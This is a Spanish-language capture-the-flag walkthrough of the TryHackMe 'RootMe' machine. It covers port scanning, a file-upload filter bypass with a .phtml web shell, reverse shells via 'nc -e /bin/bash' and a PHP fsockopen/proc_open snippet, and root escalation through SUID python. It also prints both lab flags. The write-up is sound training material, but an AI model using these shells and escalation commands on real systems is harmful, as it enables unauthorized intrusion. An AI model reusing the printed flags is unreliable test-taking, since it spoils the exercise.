# RootMe

###### tags: `Try Hack Me` `Linux` `RCE` `SUID` `Shell Reversa`
________________________

### **FLAGS:** 
    - User Flag: THM{y0u_g0t_a_sh3ll}
    - Root Flag: THM{pr1v1l3g3_3sc4l4t10n}

________________________

### **USERS:**
    - test
    - rootme

________________________

### **BASIC QUESTIONS**

-***Scan the machine, how many ports are open?*** --> 2

-***What version of Apache is running?*** --> 2.4.29

-***What service is running on port 22?*** --> SSH

-***What is the hidden directory?*** --> /panel/


### **PASOS**

1. Vemos si el host esta levantado y saber el SSOO (**Linux**: TTL <= 64)
<code>ping -c1 IP</code>

    ![](https://i.imgur.com/JWjpW0H.png)

2. Escaneamos los puertos abiertos

    - Primero vemos si va muy lento el escaneo:
    <code>nmap -p- --open -T5 -v -n IP</code>
    
            -p-		Todos los puertos
            --open 	Mostrar solos puertos abiertos
            -T5		Modo más agresivo
            -v 		Modo verbose (reporta por pantalla)
            -n		No aplicar resolución DNS
        

        ![](https://i.imgur.com/X4QOF0B.png)
        
    - Como va lento, lanzamos este otro comando:
    <code>nmap -sS --min-rate 5000 -p- -vvv -n -Pn IP</code>
    
            -sS		Realizar un TCP SYN port scan
            --min-rate	Emitir al menos 5000 paquetes por segundo
            -Pn		No realizar Host Discovery

     - Va más rápido y encuentra los puertos 22 (SSH) y 80 (HTTP)

        ![](https://i.imgur.com/Kaxg51I.png)

3. Obtenemos los servicios que corren en los puertos
<code>nmap -sC -sV -p22,80 IP</code>

    ![](https://i.imgur.com/n3keyJE.png)


4. Nos centramos en el servidor web Apache. Lanzamos un whatweb para ver si usa algún CMS tipo Wordpress, pero vemos que no, es un Apache normal

    ![](https://i.imgur.com/Q9KECLe.png)

5. Accedemos al portal web y vemos lo mismo con Wappalyzer. El portal no nos dice nada. Vemos el código fuente de la página a ver si encontramos algo. No hay nada

6. Vamos a hacer un fuzzing en el portal para encontrar alguna ruta con un script de enumeración de NMAP

    <code>nmap -sV --script=http-enum IP</code>
    
    ![](https://i.imgur.com/co4HnmM.png)
    
    - Hacemos el fuzz también con GoBuster, ya que lo pide como pregunta básica
    <code>gobuster dir -u IP -w DICT -q -n -e</code>

            -u    	Target 
            -w     	Diccionario (/usr/share/wordlists/dirb/common.txt)
            -q		Silencioso, no muestra mensajes de estado           
            -n		No muestra códigos de estado        
            -e		Muestra URLs completas
        
        ![](https://i.imgur.com/FbBO4Rv.png)

7. Accedemos a los directorios y ficheros que muestra, a ver si hay algo raro. Podemos responder ya a la última pregunta básica.

8. Tenemos un directorio /uploads vacío, donde parece que se suben cosas. En /panel/, parece un portal para subir ficheros:

    <img src="https://i.imgur.com/pAToikU.png" width="500" />

9. Montamos un pequeño script en PHP que ejecute el comando recibido por parámetro:

    ![](https://i.imgur.com/nOPUwub.png)

    - No permite subir PHP
        
        <img src="https://i.imgur.com/aFLHfjf.png" width="300" />

    - Le cambiamos la extensión a PNG y nos deja subirlo

        <img src="https://i.imgur.com/e2COdhz.png" width="300" />

    - Lo vemos en el panel de uploads
    
        <img src="https://i.imgur.com/HM530rd.png" width="400" />

    - Pero no podemos abrirlo al no ser una imagen

        ![](https://i.imgur.com/IIPrIEt.png)

    - Probamos en local con diferentes extensiones equivalentes a PHP o otros trucos como NULL BYTE *(.php3, .php5, .inc, .php.jpg, .php.%00.jpg, .html)* pero el navegador no interpreta el PHP, aunque el portal los acepta todos. 
    
    - Probamos con otra equivalente de PHP, .phtml y funciona en local. Lo subimos con un fichero con un "*echo*" y funciona

        ![](https://i.imgur.com/hfjQyOt.png)

10. Subimos el fichero que ejecuta RCE con extensión .phtml. Lo probamos y funciona:

    ![](https://i.imgur.com/EPAj1Ni.png)

______________

### **GET A SHELL** 

Vamos a intentar acceder con shell reversa. Usamos este [Cheat-Sheet](https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/).

- Levantamos un puerto en escucha en nuestro Kali:

    <code>nc -lvp 8433</code>
    
    ![](https://i.imgur.com/OhyGOCd.png)

- Probamos en nuestro Server local, introduciendo en el parametro cmd lo siguiente. Vemos que funciona

    <code>nc 10.9.3.8 8443 -e /bin/bash</code>
    
    ![](https://i.imgur.com/1JDI3Xm.png)

- Lanzamos lo mismo en el server, pero no funciona. Hay que buscar otro comando.

- Probamos creando la Shell en el propio PHP, en vez de pasarle por parámetro el comando Bash.

    <code>$sock = fsockopen($ip,$port);</code>
    
    <code>$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);</code>

    ![](https://i.imgur.com/wmD4cn7.png)

- Subimos al server el mismo script y lo probamos

    ![](https://i.imgur.com/lYabkGv.png)

- Conseguimos una Shell en el servidor como el usuario www-data.
    
- Podemos configurar una shell interactiva escribiendo lo siguiente por la shell reversa:

    1. script /dev/null -c bash
    2. CTRL + Z
    3. stty raw -echo
    4. fg
    5. reset
    6. xterm
    7. export TERM=xterm
    8. export SHELL=bash
    9. stty -a
    10. stty rows *NumRows* columns *NumCols*
        
    *Obtenemos NumRows y NumCols con stty -a en otra terminal con la misma dimensión que la shell reversa*

____________________

### **USER FLAG**

Navegamos un poco por la máquina y vemos 2 usuarios en el directorio /home (test y rootme). En sus directorios no vemos nada. Intentamos encontrar la flag user.txt con find, which, locate y whereis.
    
<code>find / -type f -name user.txt 2> /dev/null</code>

![](https://i.imgur.com/lYeZDuK.png)
    
<mark>Tenemos la user flag: **THM{y0u_g0t_a_sh3ll}**</mark>

_____________________

### **ROOT FLAG**

Vamos a intentar una escalada de privilegios en Linux siguiendo este [tutorial](https://jieliau.medium.com/privilege-escalation-on-linux-platform-8b3fbd0b1dd4)

1. En primer lugar, intentamos ver los privilegios de sudo del usuario www-data. No puede ejecutar el comando <code>sudo -l</code>.

2. Buscamos los ficheros con el SUID activo

    <code>find / -user root -perm -4000 2>/dev/null</code>
    
    <img src="https://i.imgur.com/zboRRAe.png" width="300" />

3. Nos llama la intención **/usr/bin/python**. Intentamos conseguir una shell como root con el siguiente comando, pero no funciona:

    <code>python -c 'import pty; pty.spawn("/bin/bash")'</code>
    
4. No funciona, usamos este otro [tutorial](https://gtfobins.github.io/gtfobins/python/) de GTFOBINS:

    <code>python -c 'import os; os.execl("/bin/bash", "bash", "-p")'</code>

    ![](https://i.imgur.com/tdsiKHH.png)

5. Hemos escalado privilegios. Vamos al directorio /root a por la 2a Flag.

    <mark>Tenemos la root flag: **THM{pr1v1l3g3_3sc4l4t10n}**</mark>
